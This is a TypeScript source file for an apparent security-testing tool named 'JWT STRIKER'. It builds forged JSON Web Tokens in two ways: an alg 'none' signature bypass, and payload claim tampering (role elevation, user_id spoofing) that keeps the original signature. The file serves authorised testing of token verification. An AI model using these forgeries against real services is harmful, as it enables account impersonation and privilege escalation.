/**
 * JWT STRIKER (NahamSec Alpha)
 * Performs deterministic mutations on JSON Web Tokens to test algorithm & signature flaws.
 */
export class JwtMutator {
  /**
   * Generates a JWT with the 'alg': 'none' signature bypass.
   */
  public static createAlgNoneToken(originalToken: string): string | null {
    const parts = originalToken.split('.');
    if (parts.length < 2) return null;

    try {
      const headerStr = Buffer.from(parts[0], 'base64url').toString('utf8');
      const header = JSON.parse(headerStr);
      header.alg = 'none';

      const newHeaderB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
      const payloadB64 = parts[1]; // Keep original payload intact

      // alg: none tokens require an empty signature (two dots: header.payload.)
      return `${newHeaderB64}.${payloadB64}.`;
    } catch {
      return null;
    }
  }

  /**
   * Mutates a claim in the JWT payload (e.g. elevating role or spoofing user_id)
   * without re-signing, testing if the backend verifies signatures.
   */
  public static createTamperedPayloadToken(
    originalToken: string,
    claimOverrides: Record<string, unknown>
  ): string | null {
    const parts = originalToken.split('.');
    if (parts.length < 2) return null;

    try {
      const payloadStr = Buffer.from(parts[1], 'base64url').toString('utf8');
      const payload = JSON.parse(payloadStr);

      // Apply overrides
      for (const [key, val] of Object.entries(claimOverrides)) {
        payload[key] = val;
      }

      const newPayloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
      // Return with original signature to test verification failure
      const signaturePart = parts[2] || '';
      return `${parts[0]}.${newPayloadB64}.${signaturePart}`;
    } catch {
      return null;
    }
  }
}
